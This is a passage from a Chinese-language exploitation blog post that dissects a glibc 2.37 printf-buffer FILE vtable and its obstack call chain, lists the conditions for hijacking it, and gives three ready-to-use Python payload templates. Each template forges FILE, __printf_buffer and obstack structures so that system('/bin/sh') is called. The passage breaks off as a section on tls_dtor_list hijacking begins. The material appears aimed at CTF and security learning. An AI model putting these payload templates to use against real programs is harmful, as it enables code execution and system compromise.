class="title">printf_buffer_as_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Interface to libio.  */</span></span><br><span class="line">  FILE stream;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Pointer to the underlying buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code>glibc2.37</code>中有一个新的<code>vtable</code>，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),<span class="comment">//函数一</span></span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),<span class="comment">//函数二</span></span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可知，该<code>vtable</code>内只存在两个函数，分别为<code>__printf_buffer_as_file_overflow</code>，<code>__printf_buffer_as_file_xsputn</code></p><p>这个vtable明显能看出是由_IO_obstack_jumps变化而来</p><p>接下来我们先对<code>__printf_buffer_as_file_overflow</code>进行分析(glibc-2.38\stdio-common\printf_buffer_as_file.c)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__printf_buffer_as_file_overflow (FILE *fp, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span> *<span class="title">file</span> =</span> (<span class="keyword">struct</span> __printf_buffer_as_file *) fp;</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_commit (file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* EOF means only a flush is requested.   */</span></span><br><span class="line">  <span class="keyword">if</span> (ch != EOF)</span><br><span class="line">    __printf_buffer_putc (file-&gt;next, ch);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure that flushing actually produces room.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next)</span><br><span class="line">      &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</span><br><span class="line">    __printf_buffer_flush (file-&gt;next);</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_switch_to_buffer (file);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next))</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数首先堆传入的第一个参数强制类型转换为<code>__printf_buffer_as_file</code>并赋给变量<code>file</code>，然后调用<code>__printf_buffer_as_file_commit</code>函数</p><p><strong>__printf_buffer_as_file_commit函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_as_file_commit (<span class="keyword">struct</span> __printf_buffer_as_file *file)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the write pointers in the file stream are consistent</span></span><br><span class="line"><span class="comment">     with the next buffer.  */</span></span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);</span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);</span><br><span class="line">  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);</span><br><span class="line">  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);</span><br><span class="line"></span><br><span class="line">  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出该函数通过断言对<code>file</code>结构体中的<code>stream</code>结构体与<code>next</code>结构体中的成员进行一系列判断，然后做一个赋值的操作</p><p><strong>__printf_buffer_putc函数</strong></p><p>可以看到若<code>ch != EOF</code>就调用<code>__printf_buffer_putc</code>，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_putc (<span class="keyword">struct</span> __printf_buffer *buf, <span class="type">char</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;write_ptr != buf-&gt;write_end)</span><br><span class="line">      *buf-&gt;write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    __printf_buffer_putc_1 (buf, ch);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知<code>__printf_buffer_putc</code>只是做了一些指针记录的数值加减的操作，对此我们不用过多关注。</p><p>然后有判断：<code>if (!__printf_buffer_has_failed (file-&gt;next) &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</code></p><p>就是判断<code>__printf_buffer_as_file</code>结构体中的mode成员是不是<code>__printf_buffer_mode_failed</code>以及<code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code>，我们假设满足这两个条件，会调用<code>__printf_buffer_flush (file-&gt;next)</code></p><p><strong>__printf_buffer_flush 函数</strong></p><p>该函数其实是<code>__printf_buffer_flush =&gt; Xprintf_buffer_flush =&gt; Xprintf (buffer_do_flush) (buf) =&gt; __printf_buffer_do_flush</code></p><p>我们只需要关注<code>__printf_buffer_do_flush</code>，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_do_flush (<span class="keyword">struct</span> __printf_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (buf-&gt;mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_failed:</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_snprintf:</span><br><span class="line">      __printf_buffer_flush_snprintf ((<span class="keyword">struct</span> __printf_buffer_snprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf_chk:</span><br><span class="line">      __chk_fail ();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_to_file:</span><br><span class="line">      __printf_buffer_flush_to_file ((<span class="keyword">struct</span> __printf_buffer_to_file *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_asprintf:</span><br><span class="line">      __printf_buffer_flush_asprintf ((<span class="keyword">struct</span> __printf_buffer_asprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_dprintf:</span><br><span class="line">      __printf_buffer_flush_dprintf ((<span class="keyword">struct</span> __printf_buffer_dprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_strfmon:</span><br><span class="line">      __set_errno (E2BIG);</span><br><span class="line">      __printf_buffer_mark_failed (buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp:</span><br><span class="line">      __printf_buffer_flush_fp ((<span class="keyword">struct</span> __printf_buffer_fp *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp_to_wide:</span><br><span class="line">      __printf_buffer_flush_fp_to_wide</span><br><span class="line">        ((<span class="keyword">struct</span> __printf_buffer_fp_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fphex_to_wide:</span><br><span class="line">      __printf_buffer_flush_fphex_to_wide</span><br><span class="line">        ((<span class="keyword">struct</span> __printf_buffer_fphex_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_obstack:</span><br><span class="line">      __printf_buffer_flush_obstack ((<span class="keyword">struct</span> __printf_buffer_obstack *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  __builtin_trap ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里我们关注进入<code>__printf_buffer_flush_obstack</code>函数的这一分支</p><p><strong>__printf_buffer_flush_obstack</strong></p><p><strong>注意此时参数buf类型从__printf_buffer变为了__printf_buffer_obstack</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__printf_buffer_flush_obstack (<span class="keyword">struct</span> __printf_buffer_obstack *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* About to switch buffers, so record the bytes written so far.  */</span></span><br><span class="line">  buf-&gt;base.written += buf-&gt;base.write_ptr - buf-&gt;base.write_base;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Errors are reported via a callback mechanism (presumably for</span></span><br><span class="line"><span class="comment"> process termination).  */</span></span><br><span class="line">      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);</span><br><span class="line">      [...]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设满足所有条件进入<code>obstack_1grow</code>宏定义。</p><p>在这里已经出现house of snake的特征了</p><p><strong>obstack_1grow</strong>宏定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_1grow(OBSTACK, datum)      \</span></span><br><span class="line"><span class="meta">  __extension__      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)      \</span></span><br><span class="line"><span class="meta"> _obstack_newchunk (__o, 1);      \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p><strong>_obstack_newchunk函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  [...]</span><br></pre></td></tr></table></figure><p>假设满足所有条件，进入<code>CALL_CHUNKFUN</code>这个宏定义，该宏定义的源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure><p>可以看到当<code>(((h)-&gt;use_extra_arg)</code>不为0时，会调用<code>(*(h)-&gt;chunkfun)</code>，它的参数是<code>(h)-&gt;extra_arg</code>和<code>(size)</code>，而我们可以控制<code>(*(h)-&gt;chunkfun)</code>与<code>(h)-&gt;extra_arg</code></p><p>豁然开朗,后半部分与<code>_IO_obstack_xsputn</code>的调用链一样。</p><h3 id="绕过条件-1"><a href="#绕过条件-1" class="headerlink" title="绕过条件"></a>绕过条件</h3><p>整个分析过程并将所有相关结构体，并都看成<code>__printf_buffer_as_file</code>结构体，有以下条件：</p><ul><li><strong>在<code>__printf_buffer_as_file_overflow</code>函数中：</strong><ul><li><code>file-&gt;next-&gt;mode!=__printf_buffer_mode_failed</code> &amp;&amp; <code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code></li></ul></li><li><strong>在<code>__printf_buffer_as_file_commit</code>函数中：</strong><ul><li><code>file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr</code></li><li><code>file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end</code></li><li><code>file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base</code></li><li><code>file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end</code></li></ul></li><li><strong>在<code>__printf_buffer_flush</code>函数中：</strong></li><li><code>file-&gt;next-&gt;mode =__printf_buffer_mode_obstack</code></li><li><strong>在<code>__printf_buffer_flush_obstack</code>函数中：</strong></li><li><code>buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1</code> &lt;==&gt; <code>file-&gt;next.write_ptr == &amp;(file-&gt;next) + 0x30 + 1</code></li><li><strong>在<code>obstack_1grow</code>宏定义中：</strong><ul><li><code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;next_free + 1 &gt; (struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunk_limit</code></li><li><code>(h)-&gt;use_extra_arg</code>不为0 &lt;==&gt; <code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;use_extra_arg != 0</code></li></ul></li><li>注：</li><li><code>__printf_buffer_mode_obstack</code> 就是<code>0xb</code></li></ul><h2 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h2><h3 id="模板方案1-1"><a href="#模板方案1-1" class="headerlink" title="模板方案1"></a>模板方案1</h3><p><strong>分别伪造__printf_buffer与obstack结构体</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = &amp;jumps</span><br><span class="line">fp._IO_write_ptr = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="comment">#------fake __printf_buffer---</span></span><br><span class="line">    <span class="number">0xe0</span>:leak_heap+<span class="number">0xe8</span>,</span><br><span class="line">    <span class="number">0xe8</span>:[</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_base 0</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_ptr  8</span></span><br><span class="line">    leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>,   <span class="comment">#write_end 0x10</span></span><br><span class="line">    leak_heap+<span class="number">0x110</span>,   <span class="comment">#written 0x18</span></span><br><span class="line">    p32(<span class="number">11</span>),  <span class="comment">#mode  0x20</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">#----------------------------</span></span><br><span class="line">    <span class="comment">#------fake obstack----------</span></span><br><span class="line">    <span class="number">0x110</span>:leak_heap+<span class="number">0x110</span>,</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x18</span>:[</span><br><span class="line">    <span class="string">&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x38</span>:libc.sym.system,</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x48</span>:leak_heap+<span class="number">0x110</span>+<span class="number">0x18</span>,</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x50</span>:[<span class="number">0xff</span>]</span><br><span class="line">    <span class="comment">#----------------------------</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="模板方案2-1"><a href="#模板方案2-1" class="headerlink" title="模板方案2"></a>模板方案2</h3><p><strong>obstack结构体与FILE结构体内存复用</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = <span class="number">0x1ced60</span> + lb</span><br><span class="line">fp._IO_write_ptr = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a obsatck</span></span><br><span class="line">fp._IO_read_base = <span class="number">0x68732f6e69622f</span>             <span class="comment">#0x18</span></span><br><span class="line">fp._IO_backup_base = <span class="number">0xff</span>                       <span class="comment">#0x50</span></span><br><span class="line">fp._IO_buf_base = libc.sym.system               <span class="comment">#0x38</span></span><br><span class="line">fp._IO_save_base = leak_heap+<span class="number">0x18</span>               <span class="comment">#0x48</span></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="number">0xe0</span>:leak_heap+<span class="number">0xe8</span>,</span><br><span class="line">    <span class="number">0xe8</span>:[</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_base 0</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_ptr  8</span></span><br><span class="line">    leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>,   <span class="comment">#write_end 0x10</span></span><br><span class="line">    leak_heap+<span class="number">0x110</span>,   <span class="comment">#written 0x18</span></span><br><span class="line">    p32(<span class="number">11</span>),  <span class="comment">#mode  0x20</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x110</span>:leak_heap, <span class="comment">#fake a obstack</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="模板方案3"><a href="#模板方案3" class="headerlink" title="模板方案3"></a>模板方案3</h3><p><strong>__printf_buffer结构、obstack结构体与FILE结构体内存复用</strong></p><p>这个<code>payload</code>需要的内存是最小的，只需要<code>0xe0</code>字节大小的内存。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = <span class="number">0x1ced60</span> + lb</span><br><span class="line">fp._IO_write_ptr = fake_printf_buffer+ <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = fake_printf_buffer + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a obsatck</span></span><br><span class="line">fp._IO_backup_base = <span class="number">0xff</span>                       <span class="comment">#0x50</span></span><br><span class="line">fp._IO_buf_base = libc.sym.system               <span class="comment">#0x38</span></span><br><span class="line">fp._IO_save_base = fake_fp + <span class="number">0xa0</span>             <span class="comment">#0x48</span></span><br><span class="line">fp._wide_data = <span class="number">0x68732f6e69622f</span>                <span class="comment">#0xa0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a __printf_buffer</span></span><br><span class="line">fp = payload_replace(<span class="built_in">bytes</span>(fp),&#123;</span><br><span class="line">    <span class="number">0x58</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x60</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x68</span>:fake_printf_buffer + <span class="number">0x30</span> + <span class="number">1</span>,</span><br><span class="line">    <span class="number">0x70</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x78</span>:<span class="number">11</span>,</span><br><span class="line">    <span class="number">0x80</span>:fake_fp</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="number">0xe0</span>:fake_printf_buffer,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="劫持tls-dtor-list-利用-call-tls-dtors拿到权限"><a href="#劫持tls-dtor-list-利用-call-tls-dtors拿到权限" class="headerlink" title="劫持tls_dtor_list,利用__call_tls_dtors拿到权限"></a>劫持tls_dtor_list,利用__call_tls_dtors拿到权限</h1><h2 id="概要-21"><a href="#概要-21" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>这个利用也是通过<code>exit</code>触发的，和<code>house of banana</code>实现的效果差不多，利用流程比<code>house of banana</code>简单，但是主要是用于<code>getshell</code>，在开了沙盒后，<code>orw</code>并没有<code>house of banana</code>方便。</p><p><strong>利用条件:</strong></p><ol><li>largebin 